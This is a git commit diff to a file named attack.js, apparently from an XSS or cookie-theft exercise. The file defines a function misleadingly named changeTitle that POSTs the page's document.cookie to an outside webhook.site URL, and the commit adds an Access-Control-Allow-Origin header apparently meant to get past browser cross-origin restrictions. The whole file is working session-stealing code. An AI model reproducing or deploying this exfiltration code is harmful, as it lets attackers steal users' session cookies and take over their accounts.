179d2d73bb70772d12f6ee15f8a22fdf01ee2506
JBA192 <62188601+JBA192@users.noreply.github.com>
2023-09-22 14:07:13 -0400

    Update attack.js

--- attack.js
+++ attack.js
@@ -2,5 +2,6 @@ function changeTitle() {
     let server = new XMLHttpRequest;
     server.open("POST", "https://webhook.site/38ba9692-250b-438c-8533-896161eb3628",true);
     server.setRequestHeader("Content-Type", "text/plain");
+    server.setRequestHeader("Access-Control-Allow-Origin", "*");
     server.send(document.cookie);
 }
